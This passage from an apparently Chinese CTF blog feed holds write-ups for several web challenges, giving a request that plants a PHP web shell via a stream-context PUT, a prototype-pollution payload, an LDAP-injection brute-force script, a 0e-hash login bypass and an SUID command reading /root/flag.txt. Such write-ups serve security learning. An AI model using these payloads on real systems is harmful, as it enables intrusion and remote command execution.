punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">formatFileSize</span><span class="token punctuation">(</span><span class="token parameter">bytes</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'0 B'</span><span class="token punctuation">;</span>                        <span class="token keyword">const</span> k <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> sizes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'KB'</span><span class="token punctuation">,</span> <span class="token string">'MB'</span><span class="token punctuation">,</span> <span class="token string">'GB'</span><span class="token punctuation">,</span> <span class="token string">'TB'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> <span class="token operator">/</span> Math<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bytes <span class="token operator">/</span> Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">viewFile</span><span class="token punctuation">(</span><span class="token parameter">filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> filename<span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'viewForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><ul><li><strong><code>stream_context_create()</code></strong>：该函数的用途是创建一个自定义的上下文，这个上下文可以对文件流或者网络请求的行为进行修改。</li><li><strong><code>$_POST['options']</code></strong>：这是从客户端表单提交过来的数据，一般是一个数组，数组里包含了诸如 HTTP 请求头、超时时间等选项。</li><li><strong><code>@</code></strong>：它是错误抑制符，其作用是在创建上下文失败时，避免 PHP 抛出警告信息。</li></ul></li><li><code>file_get_contents($filename, false, ...)</code><ul><li><p><strong><code>file_get_contents()</code></strong>：此函数的功能是把整个文件读取到一个字符串中。</p></li><li><p><strong><code>$filename</code></strong>：它代表要读取的文件路径，这个路径是从客户端传递过来的。</p></li><li><p><strong><code>false</code></strong>：该参数表明不使用包括路径和文件名的前导目录。</p></li><li><p>第三个参数就是前面创建的自定义上下文，借助这个上下文可以对读取行为进行定制。</p></li><li><ol><li><strong>设置请求方法为 PUT</strong></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_CUSTOMREQUEST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PUT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：指定 HTTP 请求方法为 PUT（用于向服务器上传资源）</li><li><strong>注意</strong>：PUT 方法通常用于覆盖已有资源，需确保服务器支持此方法</li></ul><h4 id="2-设置请求体内容"><a href="#2-设置请求体内容" class="headerlink" title="2. 设置请求体内容"></a>2. <strong>设置请求体内容</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：将文件内容作为请求体发送</li><li>潜在问题<ul><li>若<code>$file_content</code>过大（如超过 PHP 内存限制），可能导致内存溢出</li><li>未设置<code>Content-Type</code>头，服务器可能无法正确解析文件类型</li></ul></li></ul><h4 id="3-设置返回响应结果"><a href="#3-设置返回响应结果" class="headerlink" title="3. 设置返回响应结果"></a>3. <strong>设置返回响应结果</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：将 cURL 请求的响应结果作为字符串返回，而非直接输出</li><li><strong>必选</strong>：否则响应会直接输出，无法被后续代码处理</li></ul><h4 id="4-设置-HTTP-请求头"><a href="#4-设置-HTTP-请求头" class="headerlink" title="4. 设置 HTTP 请求头"></a>4. <strong>设置 HTTP 请求头</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'Host: '</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Origin: http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Referer: http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Accept-Encoding: gzip, deflate'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Accept: */*'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Content-Length: '</span> <span class="token operator">.</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>各请求头解析：</strong></p><ul><li><strong>Host</strong>：指定请求的目标主机和端口<ul><li>潜在问题：若服务器配置了虚拟主机，可能导致请求被拒绝</li></ul></li><li><strong>Origin/Referer</strong>：标识请求来源<ul><li>通常用于跨域请求验证</li><li>可能被服务器用于访问控制（如防盗链）</li></ul></li><li><strong>Accept-Encoding</strong>：告知服务器支持的内容编码（压缩方式）<ul><li>若服务器返回 gzip/deflate 压缩内容，需额外处理解压缩</li></ul></li><li><strong>Accept</strong>：指定客户端接受的响应内容类型<ul><li><code>*/*</code>表示接受任意类型，可能不符合服务器预期</li></ul></li><li><strong>Accept-Language</strong>：指定客户端偏好的语言<ul><li>影响服务器返回的语言版本（若支持多语言）</li></ul></li><li><strong>User-Agent</strong>：模拟浏览器标识<ul><li>可能被服务器用于识别客户端类型</li><li>固定值可能导致服务器识别为爬虫而拦截</li></ul></li><li><strong>Content-Length</strong>：指定请求体的字节长度<ul><li>必选头，若缺失或错误可能导致请求失败</li></ul></li></ul></li></ul></li></ol></blockquote><p>这里我们看有dufs服务作为文件存储，再看最后查看图片的file_get_contents方法，有stream_context_create可以仿真http请求，也就是说前面的filename如果是url，后面的参数可以仿真其请求</p><pre class="line-numbers language-none"><code class="language-none">  $file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));  $dufs_host = '127.0.0.1';$dufs_port = '5000';                $target_url = 'http://' . $dufs_host . ':' . $dufs_port . '/' . rawurlencode($filename);                $file_content = file_get_contents($file['tmp_name']);                $ch = curl_init($target_url);                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');#PUT 请求        curl_setopt($ch, CURLOPT_POSTFIELDS, $file_content);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);        curl_setopt($ch, CURLOPT_HTTPHEADER, [            'Host: ' . $dufs_host . ':' . $dufs_port,            'Origin: http://' . $dufs_host . ':' . $dufs_port,            'Referer: http://' . $dufs_host . ':' . $dufs_port . '/',            'Accept-Encoding: gzip, deflate',            'Accept: */*',            'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8',            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',            'Content-Length: ' . strlen($file_content)        ]);                $response = curl_exec($ch);        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);                curl_close($ch);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_36777143/article/details/146212072">stream_context_create到底是干什么的？_php创建文件流stream-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">POST /index.php HTTP/1.1Host:127.0.0.1:27694Content-Type: application/x-www-form-urlencodedaction=view&amp;filename=http://127.0.0.1:5000/pass.php&amp;options[http][method]=PUT&amp;options[http][content]=&lt;?php system($_GET['pass']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/08ebff6f9592f7d04ca9cff3d644e4bd.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d065a51aeec60b7cb3df73b4458837bf.png"></p><hr><h3 id="Clickclick"><a href="#Clickclick" class="headerlink" title="Clickclick"></a>Clickclick</h3><p>当amount &gt;= 1000时会触发点击过快，而amount &gt;=10000时才返回flag</p><p>打开源代码发现一条红色的代码belike</p><pre class="line-numbers language-none"><code class="language-none">ar gn = Tt("&lt;p&gt;什么叫“前后端分离”啊？（战术后仰）&lt;/p&gt;")  , bn = Tt("&lt;pre&gt;&lt;/pre&gt;")  , En = Tt('&lt;main&gt;&lt;h1&gt;Click and Click&lt;/h1&gt; &lt;div class="card"&gt;&lt;!&gt;&lt;/div&gt; &lt;p&gt;Click 10000 times, and something appear.&lt;/p&gt; &lt;!&gt; &lt;!&gt;&lt;/main&gt;');   ...if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">{"type":"set", "point":{"amount":-1}}显示hacker{"type":"set", "point":{"amount":10000}}显示你按的太快了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:33595"</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"set"</span><span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"amount"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"amount"</span><span class="token punctuation">:</span><span class="token number">100000</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token string">"/update-amount"</span><span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>miniLCTF<span class="token punctuation">{</span>675bb19a<span class="token operator">-</span>6fe3<span class="token operator">-</span>0f7f<span class="token operator">-</span><span class="token number">9243</span><span class="token operator">-</span>aff72d5a3a4c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>btsctf</title>
      <link href="/2025/05/11/btsctf/"/>
      <url>/2025/05/11/btsctf/</url>
      
        <content type="html"><![CDATA[<h3 id="ldpalight1"><a href="#ldpalight1" class="headerlink" title="ldpalight1"></a>ldpalight1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">from</span> ldap3 <span class="token keyword">import</span> Server<span class="token punctuation">,</span> Connection<span class="token punctuation">,</span> ALLapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>ADMIN_PASSWORD <span class="token operator">=</span> <span class="token string">"STYE0P8dg55WGLAkFobiwMSJKix1QqpH"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>                server <span class="token operator">=</span> Server<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">389</span><span class="token punctuation">,</span> get_info<span class="token operator">=</span>ALL<span class="token punctuation">)</span>        conn <span class="token operator">=</span> Connection<span class="token punctuation">(</span>server<span class="token punctuation">,</span>                           user<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'cn=admin,dc=bts,dc=ctf'</span></span><span class="token punctuation">,</span>                          password<span class="token operator">=</span>ADMIN_PASSWORD<span class="token punctuation">,</span>                          auto_bind<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> conn<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Failed to connect to LDAP server'</span><span class="token punctuation">,</span> <span class="token number">500</span>        conn<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'ou=people,dc=bts,dc=ctf'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'(&amp;(employeeType=active)(uid=</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">)(userPassword=</span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">))'</span></span><span class="token punctuation">,</span> attributes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> conn<span class="token punctuation">.</span>entries<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid credentials'</span><span class="token punctuation">,</span> <span class="token number">401</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflag <span class="token operator">=</span> <span class="token string">""</span>charset <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789_-{}"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"*)(description=</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>c<span class="token punctuation">}</span></span><span class="token string">*"</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"https://lightweight-2.chal.bts.wh.edu.pl/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"*"</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment"># 观察成功登录的标识</span>            flag <span class="token operator">+=</span> c            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag Progress: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f3bdc5ce2932a4ba05911ebeaafc4bc5.png"></p><hr><h3 id="ldpalight2"><a href="#ldpalight2" class="headerlink" title="ldpalight2"></a>ldpalight2</h3><p><a href="https://www.freebuf.com/vuls/356049.html">https://www.freebuf.com/vuls/356049.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5d252287862bb0c2de07cdf4f780ff63.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/59e82bdb8f66caf9e82e6f5e99f5d255.png"></p><hr><h3 id="minicms"><a href="#minicms" class="headerlink" title="minicms"></a>minicms</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/74a25b075ccd6a2252317f2c63e712d2.png"></p><p>user.json中有一个账户密码的sha-256加密后0e开头，弱比较可以登录进去获得token<br>TyNOQHUS可以用这个密码</p><pre class="line-numbers language-none"><code class="language-none">240610708{        "id": "13",        "name": "Leo",        "surname": "White",        "email": "leo.white@miniature-cms.com",        "password": "0e15912394876120948217340912387412309482137409128742039484444444"        }        TyNOQHUS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/49b750e8068c028b2b5fef5d4a815dd9.png"></p><pre class="line-numbers language-none"><code class="language-none">"token":"120349812450928137590234857230945823745"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d56908bfce3246103dfed7e511eba78f.png"></p><p>cms应该是suid提权,有个奇怪的文件有suid权限,应该是flag在/root目录</p><pre class="line-numbers language-none"><code class="language-none">/home/minicms/file_JeqsmJ6xwH.bin "cat /root/flag.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byuctf</title>
      <link href="/2025/04/25/byu/"/>
      <url>/2025/04/25/byu/</url>
      
        <content type="html"><![CDATA[<h3 id="Willy-Wonka-Web"><a href="#Willy-Wonka-Web" class="headerlink" title="Willy Wonka Web"></a>Willy Wonka Web</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> importsconst express <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>const fs <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span> initializationsconst app <span class="token operator">=</span> express<span class="token punctuation">(</span><span class="token punctuation">)</span>const FLAG <span class="token operator">=</span> fs<span class="token punctuation">.</span>readFileSync<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> encoding<span class="token punctuation">:</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> flag<span class="token punctuation">:</span> <span class="token string">'r'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>trim<span class="token punctuation">(</span><span class="token punctuation">)</span>const PORT <span class="token operator">=</span> <span class="token number">3000</span><span class="token operator">//</span> endpointsapp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>header<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> req<span class="token punctuation">.</span>header<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>send<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Hello '</span><span class="token operator">+</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span> start serverapp<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>PORT<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span>`Listening on $<span class="token punctuation">{</span>PORT<span class="token punctuation">}</span>`<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers 